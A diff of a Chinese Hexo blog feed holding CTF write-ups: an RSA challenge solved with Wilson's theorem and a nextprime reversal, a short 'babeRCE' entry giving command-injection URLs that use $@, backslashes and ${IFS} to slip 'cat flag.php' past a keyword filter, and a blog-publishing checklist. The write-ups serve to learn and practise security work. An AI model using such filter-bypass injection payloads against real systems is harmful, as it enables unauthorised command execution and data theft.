-<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p</span>():</span></span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    value_p = sympy.nextprime((math.factorial(y)) % x)  <span class="comment"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class="line">    <span class="keyword">return</span> value_p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_q</span>():</span></span><br><span class="line">    value = [getPrime(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        value.append(sympy.nextprime(value[i - <span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;value[-1] = &quot;</span>, value[-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        n = n * value[i]</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    value_q = <span class="built_in">pow</span>(q, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;value_q = &quot;</span>, value_q)</span><br><span class="line">    <span class="comment"># value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(q)</span><br><span class="line"><span class="comment"># this destroyes the rsa cryptosystem</span></span><br><span class="line">p = get_p()</span><br><span class="line">q = get_q()</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, p * q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>, c)</span><br><span class="line"><span class="comment"># c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>对于这道题，在已知p和q的情况下其实不难，所以解题中心放在对p和q的求解上。</p>
-<h2 id="阶乘求模（威尔逊定理的应用）"><a href="#阶乘求模（威尔逊定理的应用）" class="headerlink" title="阶乘求模（威尔逊定理的应用）"></a>阶乘求模（威尔逊定理的应用）</h2><p>在对p的求取过程中，遇到了一个棘手的问题，就是y的阶乘模上x，其中x和y都是非常大的数，但是有一个比较重要的细节就是x-y=99012，不妨可以试着逆推求模，这里用到了一个定理</p>
-<blockquote>
-<p>威尔逊定理：当<strong>P</strong> 为质数的时候，**( P − 2 ) ! = 1(modp)**  即 <strong>(p−1)！≡−1(modp)</strong></p>
-</blockquote>
-<p><img src="/2021/10/28/Hackergame-EasyRSA/image-20211029003443721.png" alt="image-20211029003443721"></p>
-<p>我们可以想到将阶乘运算转化成余数的运算，由于y与x的大小十分接近，故可以从 <code>(x-1)! ≡ x-1 (modx)</code>往前逆推，</p>
-<p>由于 x-1可以写成-1，x-2可以写成-2，以此类推，我们所求的y！的余数即为<code>(-1)*(-2)*...*(-99011)</code>即为 -(99011)!。于是我们可以得到 <code>-99011 * K ≡ x-1 (modx)</code> 用拓展欧几里得定理很容易求出我们所需要的K。</p>
-<h2 id="对nextPrime的逆推"><a href="#对nextPrime的逆推" class="headerlink" title="对nextPrime的逆推"></a>对nextPrime的逆推</h2><p>已知一个素数L，求其及其前九个素数。本来我一开始的思路是定义一个num从1递增，一直循环到L-num用for循环十次nextPrime得到素数L停止，乍看感觉没什么问题，但是我忽视了所求到的     L-num并不能保证一定为素数，况且这样计算的时间复杂度很高，遇到很大的数时计算很麻烦。</p>
-<blockquote>
-<p>质数分布密度：素数分布越来越稀疏，但1e18内任意两个质数的差不会很大，好像有个人证明了不会超过246。</p>
-</blockquote>
-<p>DBT告诉我可以定义一个起始量L-10000（更精确具体的话可以设置为L-2460），在L-10000到L内肯定含有超过10个素数，只需要将其添加进列表中，只取后10个即可，想法比我的要好得多。</p>
-<h1 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">c = <span class="number">110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line">value_q = <span class="number">5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">a = <span class="number">80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a-<span class="number">2460</span>,a+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> sympy.isprime(i):</span><br><span class="line">        <span class="built_in">list</span>.append(i)</span><br><span class="line">n_q = <span class="number">1</span></span><br><span class="line">phi_q = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    n_q = n_q * <span class="built_in">list</span>[-i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    phi_q = phi_q * (<span class="built_in">list</span>[-i] - <span class="number">1</span>)</span><br><span class="line">q = <span class="built_in">pow</span>(value_q, gmpy2.invert(e, phi_q), n_q)</span><br><span class="line">q = sympy.nextprime(q)</span><br><span class="line">x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">ooo = (-<span class="number">1</span> * math.factorial(<span class="number">99011</span>)) % x</span><br><span class="line">p = sympy.nextprime((gmpy2.invert(ooo, x) * (x-<span class="number">1</span>) ) % x)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), p*q)))</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="题目答案"><a href="#题目答案" class="headerlink" title="题目答案"></a>题目答案</h1><p>b’flag{CRYPT0_1s_Interesting!}’</p>
-]]></content>
-      <tags>
-        <tag>crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -367,22 +460,6 @@
 ]]></content>
       <tags>
         <tag>crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>babeRCE</title>
-    <url>/2021/10/01/babeRCE/</url>
-    <content><![CDATA[<h2 id="babeRCE"><a href="#babeRCE" class="headerlink" title="babeRCE"></a>babeRCE</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img src="/2021/10/01/babeRCE/image-20211001235119791.png" alt="image-20211001235119791"></p>
-<p>解题思路</p>
-<p>输入  47.93.215.154:5000/?rce=ls  可以得到   flag.php index.php</p>
-<p>目标就是实现指令cat flag.php 不过需要绕开指令检测</p>
-<p>在指令中穿插 \ 或 $@ 即可绕开， ${IFS} 可以代替空格</p>
-<p><code>http://47.93.215.154:5000/?rce=ca$@t$&#123;IFS&#125;fla$@g.php</code></p>
-<p><code>http://47.93.215.154:5000/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p>
-<p>其他的还有待补充</p>
-]]></content>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -565,6 +642,21 @@
 ]]></content>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客更新流程</title>
+    <url>/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="博客流程"><a href="#博客流程" class="headerlink" title="博客流程"></a>博客流程</h2><h3 id="1、写博客"><a href="#1、写博客" class="headerlink" title="1、写博客"></a>1、写博客</h3><p>执行 hexo new “名字”，hexo 创建该 md 文件，使用 typora 编辑并保存</p>
+<h3 id="2、清缓存-amp-更新渲染"><a href="#2、清缓存-amp-更新渲染" class="headerlink" title="2、清缓存&amp;更新渲染"></a>2、清缓存&amp;更新渲染</h3><p>执行hexo clean清除缓存，</p>
+<p>随后执行hexo g重新渲染静态页面</p>
+<h3 id="3、推送到码云"><a href="#3、推送到码云" class="headerlink" title="3、推送到码云"></a>3、推送到码云</h3><p>执行hexo d</p>
+<h3 id="5-预览本地静态界面"><a href="#5-预览本地静态界面" class="headerlink" title="5.预览本地静态界面"></a>5.预览本地静态界面</h3><p>执行hexo s</p>
+<h3 id="6、更新码云的静态页面"><a href="#6、更新码云的静态页面" class="headerlink" title="6、更新码云的静态页面"></a>6、更新码云的静态页面</h3><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/alpha.png"></p>
+<h3 id="7、重新访问网站"><a href="#7、重新访问网站" class="headerlink" title="7、重新访问网站"></a>7、重新访问网站</h3><p>如果遇到多次刷新无效果的情况。可以试试按F12在网络项下刷新</p>
+]]></content>
+      <tags>
+        <tag>博客入门</tag>
       </tags>
   </entry>
   <entry>
@@ -775,21 +867,6 @@
 ]]></content>
       <tags>
         <tag>crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客更新流程</title>
-    <url>/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="博客流程"><a href="#博客流程" class="headerlink" title="博客流程"></a>博客流程</h2><h3 id="1、写博客"><a href="#1、写博客" class="headerlink" title="1、写博客"></a>1、写博客</h3><p>执行 hexo new “名字”，hexo 创建该 md 文件，使用 typora 编辑并保存</p>
-<h3 id="2、清缓存-amp-更新渲染"><a href="#2、清缓存-amp-更新渲染" class="headerlink" title="2、清缓存&amp;更新渲染"></a>2、清缓存&amp;更新渲染</h3><p>执行hexo clean清除缓存，</p>
-<p>随后执行hexo g重新渲染静态页面</p>
-<h3 id="3、推送到码云"><a href="#3、推送到码云" class="headerlink" title="3、推送到码云"></a>3、推送到码云</h3><p>执行hexo d</p>
-<h3 id="5-预览本地静态界面"><a href="#5-预览本地静态界面" class="headerlink" title="5.预览本地静态界面"></a>5.预览本地静态界面</h3><p>执行hexo s</p>
-<h3 id="6、更新码云的静态页面"><a href="#6、更新码云的静态页面" class="headerlink" title="6、更新码云的静态页面"></a>6、更新码云的静态页面</h3><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/alpha.png"></p>
-<h3 id="7、重新访问网站"><a href="#7、重新访问网站" class="headerlink" title="7、重新访问网站"></a>7、重新访问网站</h3><p>如果遇到多次刷新无效果的情况。可以试试按F12在网络项下刷新</p>
-]]></content>
-      <tags>
-        <tag>博客入门</tag>
       </tags>
   </entry>
   <entry>
